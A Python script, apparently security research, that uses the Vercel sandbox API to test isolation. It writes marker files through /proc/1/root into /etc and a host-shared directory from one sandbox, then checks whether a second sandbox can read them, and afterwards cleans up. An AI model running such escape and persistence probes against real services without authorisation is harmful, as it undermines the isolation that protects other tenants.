# 实验J82: /proc/1/root 写宿主共享区(vda bind-mount)跨沙箱持久性验证 + shell 视图对比
import json, time, urllib.request, urllib.error, sys, base64, re
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    out = ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return out

def create(name):
    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
               {"projectId": PROJ, "name": name,
                "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
    print("create", name, ":", c)
    return json.loads(r)["sandbox"]["currentSessionId"]

NAME_A = "expj82a"
NAME_B = "expj82b"

# ---------- 沙箱 A: shell 视图对比 + 写宿主共享区 ----------
SID_A = create(NAME_A)
print("sid A:", SID_A)

PROBE_A = r"""
import os, stat as stmod

print("== [1A] shell 视图: /run/vercel/share 内容与权限 ==", flush=True)
for e in sorted(os.listdir("/run/vercel/share")):
    p = "/run/vercel/share/" + e
    st = os.lstat(p)
    print("  %-30s mode=%o uid=%d gid=%d size=%d" % (e, st.st_mode & 0o777, st.st_uid, st.st_gid, st.st_size), flush=True)

print("== [2A] shell 视图 vs PID1 视图对比 ==", flush=True)
for p in ["/etc/hosts", "/etc/passwd", "/etc/shadow", "/etc/resolv.conf",
          "/run/vercel/share/sandbox-init", "/opt", "/vercel", "/root"]:
    shell = os.path.exists(p)
    pid1 = os.path.exists("/proc/1/root" + p)
    same = False
    if shell and pid1:
        try:
            same = open(p, "rb").read(64) == open("/proc/1/root" + p, "rb").read(64)
        except Exception:
            pass
    print("  %-40s shell=%-5s pid1=%-5s same64=%s" % (p, shell, pid1, same), flush=True)

print("== [3A] shell 直接写 /etc /run/vercel/share (对比, 不经 /proc/1/root) ==", flush=True)
for t in ["/etc/px_shell_test", "/run/vercel/share/px_shell_test"]:
    try:
        with open(t, "w") as f:
            f.write("shell-direct")
        print("  SHELL WRITE OK: %s" % t, flush=True)
    except Exception as e:
        print("  SHELL WRITE FAIL: %s -> %s: %s" % (t, type(e).__name__, e), flush=True)

print("== [4A] /proc/1/root 写宿主共享区 (vda bind-mount) ==", flush=True)
try:
    with open("/proc/1/root/run/vercel/share/px_persist", "w") as f:
        f.write("px_persist_marker_0820")
    print("  WRITE OK: /proc/1/root/run/vercel/share/px_persist", flush=True)
    print("  readback: %r" % open("/proc/1/root/run/vercel/share/px_persist", "rb").read(), flush=True)
    st = os.stat("/proc/1/root/run/vercel/share/px_persist")
    print("  stat: mode=%o uid=%d gid=%d" % (st.st_mode & 0o777, st.st_uid, st.st_gid), flush=True)
except Exception as e:
    print("  WRITE FAIL: %s: %s" % (type(e).__name__, e), flush=True)

print("== [5A] /proc/1/root 写 /etc (宿主PID1视图) ==", flush=True)
try:
    with open("/proc/1/root/etc/px_persist2", "w") as f:
        f.write("px_persist2_marker_0820")
    print("  WRITE OK: /proc/1/root/etc/px_persist2", flush=True)
    print("  readback: %r" % open("/proc/1/root/etc/px_persist2", "rb").read(), flush=True)
    # shell 视图是否可见?
    print("  shell view /etc/px_persist2 exists:", os.path.exists("/etc/px_persist2"), flush=True)
except Exception as e:
    print("  WRITE FAIL: %s: %s" % (type(e).__name__, e), flush=True)

print("== [6A] 当前 uid/caps ==", flush=True)
import subprocess
r = subprocess.run(["sh", "-c", "id && grep CapEff /proc/self/status"], capture_output=True, text=True)
print(r.stdout, flush=True)
"""
run_cmd(SID_A, PROBE_A, "A-write-shared", wait=True, timeout=120000)

# ---------- 沙箱 B: 读 A 写的跨沙箱文件 ----------
SID_B = create(NAME_B)
print("sid B:", SID_B)

PROBE_B = r"""
import os
print("== [1B] 跨沙箱读 A 写入的文件 ==", flush=True)
for p in ["/proc/1/root/run/vercel/share/px_persist", "/proc/1/root/etc/px_persist2"]:
    try:
        d = open(p, "rb").read()
        print("  FOUND %s: %r" % (p, d), flush=True)
    except Exception as e:
        print("  MISS  %s: %s: %s" % (p, type(e).__name__, e), flush=True)
print("== [2B] B 的 shell 视图是否可见 ==", flush=True)
for p in ["/run/vercel/share/px_persist", "/etc/px_persist2"]:
    print("  %s exists=%s" % (p, os.path.exists(p)), flush=True)
"""
run_cmd(SID_B, PROBE_B, "B-cross-sandbox-read", wait=True, timeout=120000)

# ---------- 沙箱 A: 清理写入的测试文件(不留污染) ----------
PROBE_A2 = r"""
import os
print("== [7A] 清理测试文件 ==", flush=True)
for p in ["/proc/1/root/run/vercel/share/px_persist", "/proc/1/root/etc/px_persist2",
          "/proc/1/root/tmp/px_write_test.txt", "/proc/1/root/vercel/px_write_test.txt",
          "/proc/1/root/etc/px_write_test.txt", "/proc/1/root/root/px_write_test.txt"]:
    try:
        os.unlink(p)
        print("  removed %s" % p, flush=True)
    except Exception as e:
        print("  %s rm EXC: %s" % (p, e), flush=True)
# shell 直接写的也清理
for p in ["/etc/px_shell_test", "/run/vercel/share/px_shell_test"]:
    try:
        os.unlink(p)
        print("  removed %s" % p, flush=True)
    except Exception as e:
        print("  %s rm EXC: %s" % (p, e), flush=True)
"""
run_cmd(SID_A, PROBE_A2, "A-cleanup", wait=True, timeout=120000)

for n in (NAME_A, NAME_B):
    api("DELETE", f"/v2/sandboxes/{n}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
